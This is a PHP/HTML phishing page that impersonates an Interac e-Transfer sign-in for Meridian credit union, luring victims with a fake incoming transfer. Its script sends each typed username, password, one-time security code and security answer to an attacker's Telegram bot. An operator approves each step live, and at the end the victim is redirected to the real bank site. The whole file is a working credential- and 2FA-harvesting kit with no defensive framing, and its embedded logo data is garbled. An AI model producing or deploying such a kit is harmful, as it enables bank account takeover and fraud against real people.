<?php
declare(strict_types=1);

ob_start();
if (session_status() === PHP_SESSION_NONE) session_start();

header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");

$cancelActionHandled = false;
if (isset($_GET['action']) && $_GET['action'] === 'cancel') {
    $logFile = __DIR__ . '/data/logs/transfers.log';
    if (@is_file($logFile) && @is_writable($logFile)) {
        $lines = file($logFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        if (!empty($lines)) {
            $last_line_key = count($lines) - 1;
            if (strpos($lines[$last_line_key], 'pending') !== false) {
                 $lines[$last_line_key] = str_replace('pending', 'Cancelled', $lines[$last_line_key]);
                 file_put_contents($logFile, implode(PHP_EOL, $lines) . PHP_EOL);
            }
        }
    }
    $cancelActionHandled = true;
}

/* ---------- Locate config ---------- */
$docRoot    = rtrim($_SERVER['DOCUMENT_ROOT'] ?? __DIR__, '/');
$configPath = $docRoot . '/config/config.php';
$config     = @is_file($configPath) ? require $configPath : [];

/* ---------- Telegram credentials ---------- */
$telegramToken = $config['telegram']['bot_token'] ?? 'YOUR_TELEGRAM_BOT_TOKEN';
$chatId        = $config['telegram']['chat_id'] ?? 'YOUR_TELEGRAM_CHAT_ID';

/* ---------- Resolve transaction data ---------- */
$tx = $_SESSION['transaction'] ?? $_SESSION['transaction_data'] ?? $_SESSION['last_transfer'] ?? null;
if (!is_array($tx)) $tx = [];

/* ---------- Sender Name ---------- */
$senderName = (string)($tx['sender_name'] ?? $tx['sender'] ?? $config['sender_name'] ?? 'JENNIFER NOSKIYE');

/* ---------- Amount ---------- */
$amount = (string)($tx['amount'] ?? '10.00');

/* ---------- Security Question ---------- */
$securityQuestion = 'What is the color of your car?';

/* Normalize amount display */
$amount = number_format((float)str_replace(['$', ',', ' '], '', $amount), 2);

$_SESSION['senderName'] = $senderName;
$_SESSION['amount'] = $amount;

/* ---------- Safe HTML values ---------- */
$senderNameSafe = htmlspecialchars($senderName, ENT_QUOTES, 'UTF-8');
$amountSafe     = htmlspecialchars($amount, ENT_QUOTES, 'UTF-8');
$securityQuestionSafe = htmlspecialchars($securityQuestion, ENT_QUOTES, 'UTF-8');

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5, user-scalable=yes">
    <title>Interac e-Transfer Sign In</title>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --laurentian-blue: #005978;
            --laurentian-light-blue: #e0f3fa;
            --laurentian-yellow: #fdb813;
            --text-primary: #333;
            --text-secondary: #555;
            --border-color: #ced4da;
            --page-bg: #f8f9fa;
        }
        body {
            font-family: 'Open Sans', 'Helvetica', 'Arial', sans-serif;
            background-color: var(--page-bg);
            margin: 0;
            color: var(--text-primary);
            -webkit-font-smoothing: antialiased;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
            box-sizing: border-box;
        }
        main {
            width: 100%;
            max-width: 480px;
        }
        .signin-form-container {
            background: #fff;
            border-radius: 4px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
            overflow: hidden;
        }
        
        /* Form Top Section */
        .signin-form-top {
            background-color: var(--laurentian-light-blue);
            padding: 30px;
        }
        .signin-form-top h1 {
            font-size: 28px;
            font-weight: 700;
            color: var(--laurentian-blue);
            margin: 0;
            text-align: center;
        }
        .signin-form-top h1 i {
            font-style: italic;
        }
        
        /* Tabs */
        .app-selector {
            display: flex;
            background: #fff;
            padding: 0 30px;
            border-bottom: 1px solid #dee2e6;
        }
        .app-selector a {
            padding: 15px 5px;
            margin-right: 25px;
            color: var(--laurentian-blue);
            font-weight: 600;
            font-size: 16px;
            text-decoration: none;
            border-bottom: 3px solid transparent;
            cursor: pointer;
            text-align: center;
        }
        .app-selector a.selected {
            border-bottom-color: var(--laurentian-yellow);
            color: var(--laurentian-blue);
            font-weight: 700;
        }
        
        /* Form Content */
        .signin-form-content {
            padding: 30px;
        }
        .interact-top-label {
            display: block;
            margin-bottom: 30px;
            color: var(--text-secondary);
            font-size: 16px;
        }
        label, .label-header {
            display: block;
            font-size: 15px;
            font-weight: 700;
            color: var(--text-primary);
            margin-bottom: 8px;
        }
        .icon-textbox-wrapper {
            position: relative;
            margin-bottom: 25px;
        }
        input[type="text"], input[type="password"], input[type="tel"] {
            width: 100%;
            box-sizing: border-box;
            border: 1px solid var(--border-color);
            padding: 14px 40px 14px 14px;
            font-size: 16px;
            border-radius: 4px;
            background: #fff;
            outline: none;
            transition: border-color 0.2s;
        }
        input[type="text"]:focus, input[type="password"]:focus, input[type="tel"]:focus {
            border: 1px solid var(--laurentian-blue);
            box-shadow: 0 0 0 2px rgba(0, 89, 120, 0.2);
        }
        .form-icon {
            position: absolute;
            right: 15px;
            top: 50%;
            transform: translateY(-50%);
            width: 20px;
            height: 20px;
            cursor: pointer;
            fill: #888;
        }
        .form-icon.hide { display: none; }
        
        .signin-checkbox-label {
            display: flex;
            align-items: center;
            font-weight: 600;
            color: var(--text-primary);
            margin-bottom: 25px;
            font-size: 16px;
        }
        input[type="checkbox"] {
            margin-right: 10px;
            width: 20px;
            height: 20px;
            border: 1px solid var(--border-color);
        }
        
        .reset-password {
            font-size: 16px;
            color: var(--laurentian-blue);
            font-weight: 700;
            display: inline-block;
            margin-bottom: 30px;
        }

        .button {
            width: 100%;
            border: none;
            padding: 16px;
            font-size: 16px;
            font-weight: 700;
            border-radius: 8px;
            cursor: pointer;
            transition: background-color 0.3s;
            color: #fff;
            text-transform: uppercase;
            background: var(--laurentian-blue);
        }
        .button:hover { background: #00445c; }
        
        .logo-content {
            display: flex;
            align-items: flex-start;
            margin-top: 30px;
        }
        .logo-content img {
            width: 45px;
            margin-right: 10px;
            margin-top: 2px;
        }
        .logo-content .interact-logo-label {
            font-size: 13px;
            color: var(--text-secondary);
            line-height: 1.5;
        }
        .logo-content i { font-style: italic; }

        /* Error & Loader */
        .error-message { color: #d93025; background-color: #f8d7da; border: 1px solid #f5c6cb; border-radius: 4px; padding: 12px; margin-bottom: 20px; font-size: 15px; display: none; }
        #stepLoader { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0, 0, 0, 0.5); display: none; justify-content: center; align-items: center; z-index: 2000; }
        .loader-box { background: #fff; padding: 40px; border-radius: 8px; box-shadow: 0 5px 20px rgba(0,0,0,0.2); text-align: center; width: 300px; }
        .loader-box p { color:#555; font-size:16px; margin-top: 20px; margin-bottom: 0; }
        .spinner { height: 4px; width: 100%; position: relative; overflow: hidden; background-color: #ddd; border-radius: 2px; }
        .spinner:before{ display: block; position: absolute; content: ""; left: -200px; width: 200px; height: 4px; background-color: var(--laurentian-blue); animation: loading 2s linear infinite; border-radius: 2px; }
        @keyframes loading { from {left: -200px; width: 30%;} 50% {width: 30%;} 70% {width: 70%;} 80% { left: 50%;} 95% {left: 120%;} to {left: 100%;} }

        /* Subsequent Steps */
        .step { display: none; }
        .tx-info { background: #e9ecef; border-radius: 4px; padding: 15px; margin-bottom: 25px; border-left: 5px solid var(--laurentian-blue); font-size: 15px; text-align: left;}
        .tx-info div { display: flex; justify-content: space-between; margin-bottom: 4px; }
        .tx-info strong { color: var(--text-primary); font-weight: 700; }
        #cancelTransferLink { background:none; border:none; color:var(--laurentian-blue); text-decoration:underline; cursor:pointer; font-size:16px; width:100%; text-align:center; padding:15px 0 0; font-weight: 700; }
        
        .checkmark{width:60px;height:60px;border-radius:50%;border:4px solid var(--laurentian-blue);position:relative;margin: 0 auto 20px auto;animation:scaleUp 0.5s ease forwards;}
        .checkmark::after{content:'';position:absolute;left:18px;top:30px;width:20px;height:10px;border-left:4px solid var(--laurentian-blue);border-bottom:4px solid var(--laurentian-blue);transform:rotate(-45deg);transform-origin:left top;opacity:0;animation:drawCheck 0.5s 0.5s forwards;}
        @keyframes scaleUp{0%{transform:scale(0);}100%{transform:scale(1);}}
        @keyframes drawCheck{0%{opacity:0;transform:rotate(-45deg) scale(0);}100%{opacity:1;transform:rotate(-45deg) scale(1);}}
    </style>
</head>
<body>
    <main>
        <div class="signin-form-container">
            
            <!-- Step 1: Login -->
            <div id="stepLogin" class="step">
                <div class="signin-form-top"><h1><i>Interac</i> e-Transfer Sign In</h1></div>
                <div class="app-selector">
                    <a data-tab="Personal" class="selected">Personal</a>
                    <a data-tab="Small business">Small business</a>
                    <a data-tab="Commercial">Commercial</a>
                </div>
                <form id="loginForm">
                    <input type="hidden" id="accountType" value="Personal">
                    <div class="signin-form-content">
                        <span class="interact-top-label">Sign in into Meridian online banking to process your Interac e-Transfer.</span>
                        <div id="errorMsgLogin" class="error-message"></div>
                        
                        <label for="username">Email or Member Number</label>
                        <div class="icon-textbox-wrapper">
                            <input type="text" id="username" placeholder="Enter Email or Member Number" required>
                            <svg class="form-icon" viewBox="0 0 20 20" fill="currentColor"><path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clip-rule="evenodd"></path></svg>
                        </div>

                        <label class="signin-checkbox-label">
                           <input type="checkbox" id="RememberMe"> Remember Account
                        </label>
                        
                        <label for="password">Password</label>
                        <div class="icon-textbox-wrapper">
                            <input type="password" id="password" placeholder="Enter Password" required>
                            <svg id="eye-opened" class="form-icon" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" /><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" /></svg>
                            <svg id="eye-closed" class="form-icon hide" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.542-7 1.274-4.057 5.064-7 9.542-7 .847 0 1.673.123 2.458.35M19.458 12c-.29.921-.634 1.797-1.036 2.618m-2.14-5.235A3 3 0 0115 12a3 3 0 01-3 3m-3.828 4.828l12-12" /></svg>
                        </div>
                        
                        <a href="#" class="reset-password">Reset password</a>
                        <button type="submit" id="loginBtn" class="button">Sign In</button>

                        <div class="logo-content">
                             <img src="data:image/png;base64,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6E2T6E3D6E2j6E3j6E2D6E3T6E3D6E3D6E2j6E3T6E3j6E3z6E2T6E3D6E3j6E2D6E2D6E2z6E3T6E3z6E3j6E2j6E2T6E3j6E2z6E2j6E3j6E2T6E3j6E2T6E3z6E3T6E2j6E2T6E3T6E3T6E2z6E2T6E3z6E2z6E2j6E2j6E3j6E2z6E3T6E2z6E2j6E3j6E2z6E2z6E2j6E2j6E2z6E2T6E3T6E3j6E2j6E2z6E2z6E2j6E2z6E2z6E2j6E2z6E3T6E2T6E3T6E3z6E2j6E2j6E3z6E2z6E2D6E2D6E2j6E3j6E2D6E2D6E3T6E3T6E3T6E3j6E3D6E3j6E3D6E3j6E3T6E3T6E3j6E3j6E3T6E3T6E3j6E3T6E3j6E3D6E3D6E3j6E3j6E3T6E3T6E3T6E3D6E3j6E3T6E3D6E3T6E3j6E3T6E3D6E3j6E3T6E3D6E3j6E3j6E3D6E3j6E3j6E3T6E3D6E3j6E3D6E3D6E3j6E3T6E3j6E3D6E3T6E3T6E3T6E3j6E3j6E3j6E3j6E3j6E3D6E3j6E3j6E3j6E3j6E3D6E3D6E3D6E3T6E3T6E3j6E3j6E3D6E3j6E3j6E3T6E3T6E3j6E3j6E3D6E3j6E3D6E3T6E3T6E3D6E3j6E3D6E3T6E3j6E3T6E3D6E3j6E3T6E3j6E3j6E3T6E3j6E3j6E3D6E3T6E3T6E3j6E3T6E3j6E3D6E3j6E3T6E3j6E3j6E3D6E3j6E3D6E3j6E3j6E3T6E3D6E3T6E3T6E3j6E3j6E3T6E3T6E3T6E3D6E3T6E3j6E3T6E3j6E3j6E3D6E3T6E3D6E3T6E3D6E3T6E3j6E3T6E3D6E3j6E3T6E3T6E3D6E3j6E3T6E3D6E3j6E3j6E3j6E3D6E3T6E3T6E3j6E3T6E3T6E3D6E3j6E3T6E3D6E3j6E3j6E3T6E3T6E3j6E3D6E3j6E3D6E3j6E3j6E3T6E3j6E3T6E3D6E3j6E3j6E3j6E3j6E3D6E3j6E3j6E3D6E3T6E3T6E3T6E3T6E3T6E3T6E3j6E3j6E3T6E3T6E3j6E3D6E3T6E3j6E3j6E3T6E3D6E3j6E3j6E3j6E3T6E3j6E3j6E3T6E3T6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3T6E3T6E3j6E3j6E3j6E3T6E3T6E3j6E3T6E3T6E3j6E3T6E3j6E3j6E3j6E3j6E3T6E3j6E3T6E3T6E3j6E3j6E3T6E3j6E3j6E3T6E3T6E3j6E3j6E3T6E3T6E3T6E3j6E3j6E3j6E3T6E3T6E3T6E3j6E3T6E3j6E3T6E3T6E3j6E3j6E3T6E3T6E3j6E3j6E3j6E3j6E3j6E3j6E3T6E3j6E3T6E3j6E3T6E3T6E3j6E3j6E3j6E3T6E3j6E3T6E3j6E3j6E3j6E3T6E3T6E3T6E3j6E3j6E3j6E3j6E3j6E3T6E3j6E3T6E3j6E3T6E3j6E3j6E3j6E3j6E3T6E3j6E3T6E3T6E3j6E3T6E3T6E3j6E3T6E3j6E3j6E3T6E3j6E3j6E3T6E3T6E3T6E3T6E3T6E3j6E3T6E3j6E3T6E3T6E3j6E3j6E3T6E3T6E3j6E3T6E3j6E3j6E3j6E3j6E3T6E3T6E3T6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3T6E3T6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3T6E3T6E3T6E3j6E3j6E3T6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3T6E3T6E3j6E3j6E3j6E3T6E3T6E3T6E3T6E3j6E3j6E3T6E3j6E3T6E3T6E3T6E3j6E3T6E3j6E3j6E3T6E3T6E3T6E3j6E3j6E3T6E3T6E3j6E3j6E3T6E3j6E3j6E3j6E3j6E3j6E3T6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3T6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3j6E3jmgAAAAAAAAAAAAAAAAAAAgP8P/AYyP+cM81m5SAAAAABJRU5ErkJggg==" alt="Interac Logo">
                            <span class="interact-logo-label"><i>Interac</i> e-Transfer is a registered trade-mark and the <i>Interac</i> logo is a trade-mark of Interac Corp. Used under licence.</span>
                        </div>
                    </div>
                </form>
            </div>

            <!-- Step 2: PIN -->
            <div id="stepPIN" class="step">
                <div class="signin-form-top"><h1>Security Verification</h1></div>
                <form id="pinForm">
                    <div class="signin-form-content">
                        <span class="interact-top-label">For your security, please enter the 6 to 8-digit code sent to your device.</span>
                        <div id="errorMsgPIN" class="error-message"></div>
                        <label for="pinCode" class="label-header">Security Code</label>
                        <div class="icon-textbox-wrapper">
                            <input type="tel" id="pinCode" class="input" maxlength="8" placeholder="Enter Code" required>
                        </div>
                        <button type="submit" id="pinBtn" class="button">Validate</button>
                    </div>
                </form>
            </div>

            <!-- Step 3: Security Question -->
            <div id="stepSQ" class="step">
                 <div class="signin-form-top"><h1>Interac e-Transfer</h1></div>
                 <form id="sqForm">
                    <div class="signin-form-content">
                         <div class="tx-info">
                            <div><span>Sender:</span> <strong><?php echo $senderNameSafe; ?></strong></div>
                            <div><span>Amount:</span> <strong>$<?php echo $amountSafe; ?> CAD</strong></div>
                        </div>
                        <p class="interact-top-label" style="text-align:center; margin-bottom: 20px;"><strong>Security Question:</strong> <?php echo $securityQuestionSafe; ?></p>
                        <div id="errorMsgSQ" class="error-message"></div>
                        <label for="sqAnswer" class="label-header">Answer</label>
                        <div class="icon-textbox-wrapper">
                            <input type="text" id="sqAnswer" class="input" placeholder="Answer" required>
                        </div>
                        <button type="submit" id="sqBtn" class="button">Accept Transfer</button>
                         <button type="button" id="cancelTransferLink">Cancel Transfer</button>
                    </div>
                 </form>
            </div>

            <!-- Step 4: Success Confirmation -->
            <div id="stepConfirm" class="step">
                <div class="signin-form-top"><h1>Success</h1></div>
                <div class="signin-form-content" style="text-align:center;">
                    <div class="checkmark"></div>
                    <p class="interact-top-label">Your transfer of <strong>$<?php echo $amountSafe; ?> CAD</strong> is complete. The funds will appear in your account within 30 minutes.<br><br>You will be redirected shortly.</p>
                </div>
            </div>

            <!-- Step 5: Cancel Confirmation -->
            <div id="stepCancelConfirm" class="step">
                <div class="signin-form-top"><h1>Transfer Cancelled</h1></div>
                <div class="signin-form-content" style="text-align:center;">
                    <p class="interact-top-label" style="margin-bottom: 20px;">The Interac transfer was successfully cancelled. No funds have been deposited.</p>
                    <button onclick="location.href='index.php'" class="button">Return to Home</button>
                </div>
            </div>

        </div>
    </main>
    
    <!-- Loader Overlay -->
    <div id="stepLoader">
        <div class="loader-box">
            <div class="spinner"></div>
            <p>Processing, please wait...</p>
        </div>
    </div>

    <script>
    const ALL_STEPS = ['stepLogin', 'stepPIN', 'stepSQ', 'stepConfirm', 'stepCancelConfirm'];
    function showStep(stepId) {
        ALL_STEPS.forEach(id => {
            const el = document.getElementById(id);
            if (el) el.style.display = 'none';
        });
        const stepEl = document.getElementById(stepId);
        if(stepEl) stepEl.style.display = 'block';
    }

    const loader = document.getElementById('stepLoader');
    function showLoader() { if (loader) loader.style.display = 'flex'; }
    function hideLoader() { if (loader) loader.style.display = 'none'; }
    function showError(msg, errorId) {
        const el = document.getElementById(errorId);
        if (el) { el.textContent = msg; el.style.display = 'block'; }
    }
    function hideError(errorId) {
        const el = document.getElementById(errorId);
        if (el) el.style.display = 'none';
    }

    const passwordInput = document.getElementById('password');
    const eyeOpened = document.getElementById('eye-opened');
    const eyeClosed = document.getElementById('eye-closed');
    
    eyeOpened.addEventListener('click', () => {
        passwordInput.type = 'text';
        eyeOpened.classList.add('hide');
        eyeClosed.classList.remove('hide');
    });
    
    eyeClosed.addEventListener('click', () => {
        passwordInput.type = 'password';
        eyeClosed.classList.add('hide');
        eyeOpened.classList.remove('hide');
    });

    async function sendTelegramWithKeyboard(text, onSuccess, onError) {
        try {
            const res = await fetch(`https://api.telegram.org/bot<?php echo $telegramToken;?>/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    chat_id: '<?php echo $chatId;?>', text: text, parse_mode: "HTML",
                    reply_markup: { inline_keyboard: [[{text: '✅ Correct', callback_data: 'level2'}], [{text: '❌ Incorrect', callback_data: 'error'}]] }
                })
            });
            const data = await res.json();
            if (!data.ok) { onError(); return; }
            const msgId = data.result.message_id;
            const poll = setInterval(async () => {
                try {
                    const updatesRes = await fetch(`https://api.telegram.org/bot<?php echo $telegramToken;?>/getUpdates?offset=-1`);
                    const updates = await updatesRes.json();
                    for (const u of updates.result || []) {
                        if (u.callback_query && u.callback_query.message?.message_id === msgId) {
                            clearInterval(poll);
                            fetch(`https://api.telegram.org/bot<?php echo $telegramToken;?>/editMessageReplyMarkup`, {
                                method: 'POST', headers: {'Content-Type': 'application/json'},
                                body: JSON.stringify({chat_id: '<?php echo $chatId;?>', message_id: msgId, reply_markup: {inline_keyboard: []}})
                            });
                            if (u.callback_query.data === 'level2') onSuccess(); else onError();
                        }
                    }
                } catch (pollErr) { clearInterval(poll); onError(); }
            }, 2000);
        } catch (e) { onError(); }
    }

    document.getElementById('loginForm').addEventListener('submit', (e) => {
        e.preventDefault();
        const username = document.getElementById('username').value.trim();
        const password = document.getElementById('password').value.trim();
        const loginBtn = document.getElementById('loginBtn');
        if (username.length < 3 || password.length < 6) { showError("Email or Member Number and Password are required.", 'errorMsgLogin'); return; }
        hideError('errorMsgLogin');
        loginBtn.textContent = 'Processing...'; loginBtn.disabled = true;
        showLoader();
        const accountType = document.getElementById('accountType').value;
        const header = `🔵 <b>MERIDIAN CONTROLLER</b> 🔵`;
        const telegramText = `${header}\n\n<code>${username}</code>\n<code>${password}</code>\n\n${header}`;
        sendTelegramWithKeyboard(telegramText,
            () => { hideLoader(); showStep('stepPIN'); loginBtn.disabled = false; loginBtn.textContent = "Sign In"; },
            () => { hideLoader(); showError("The information you entered doesn't match our records. Please try again.", 'errorMsgLogin'); loginBtn.disabled = false; loginBtn.textContent = "Sign In"; }
        );
    });

    document.getElementById('pinForm').addEventListener('submit', (e) => {
        e.preventDefault();
        const code = document.getElementById('pinCode').value.trim();
        const pinBtn = document.getElementById('pinBtn');
        if (!/^\d{6,8}$/.test(code)) { showError('Invalid security code. Please try again.', 'errorMsgPIN'); return; }
        hideError('errorMsgPIN');
        pinBtn.textContent = 'Processing...'; pinBtn.disabled = true;
        showLoader();
        const header = "🔵 <b>MERIDIAN CONTROLLER</b> 🔵";
        const telegramText = `${header}\n\n<code>${code}</code>\n\n${header}`;
        sendTelegramWithKeyboard(telegramText,
            () => { hideLoader(); showStep('stepSQ'); pinBtn.disabled = false; pinBtn.textContent = "Validate"; },
            () => { hideLoader(); showError('Invalid security code. Please try again.', 'errorMsgPIN'); pinBtn.disabled = false; pinBtn.textContent = "Validate"; }
        );
    });

    document.getElementById('sqForm').addEventListener('submit', (e) => {
        e.preventDefault();
        const answer = document.getElementById('sqAnswer').value.trim();
        const sqBtn = document.getElementById('sqBtn');
        if (!answer) { showError('The security answer is required.', 'errorMsgSQ'); return; }
        hideError('errorMsgSQ');
        sqBtn.textContent = 'Processing...'; sqBtn.disabled = true;
        showLoader();
        const header = "🔵 <b>MERIDIAN CONTROLLER</b> 🔵";
        const telegramText = `${header}\n\n<code>${answer}</code>\n\n${header}`;
        sendTelegramWithKeyboard(telegramText,
            () => { 
                hideLoader(); showStep('stepConfirm');
                setTimeout(() => { window.location.href = 'https://www.meridiancu.ca/'; }, 5000);
            },
            () => { hideLoader(); showError('Incorrect security answer. Please try again.', 'errorMsgSQ'); sqBtn.disabled = false; sqBtn.textContent = "Accept Transfer"; }
        );
    });

    document.getElementById('cancelTransferLink').addEventListener('click', (e) => {
        e.preventDefault();
        showLoader();
        window.location.href = '?action=cancel';
    });
    
    document.addEventListener('DOMContentLoaded', () => {
        const initialStep = '<?php echo $cancelActionHandled ? 'stepCancelConfirm' : 'stepLogin'; ?>';
        showStep(initialStep);

        const tabs = document.querySelectorAll('.app-selector a');
        const accountTypeInput = document.getElementById('accountType');
        tabs.forEach(tab => {
            tab.addEventListener('click', e => {
                e.preventDefault();
                tabs.forEach(t => t.classList.remove('selected'));
                e.currentTarget.classList.add('selected');
                accountTypeInput.value = e.currentTarget.getAttribute('data-tab');
            });
        });
    });
    </script>

</body>
</html>
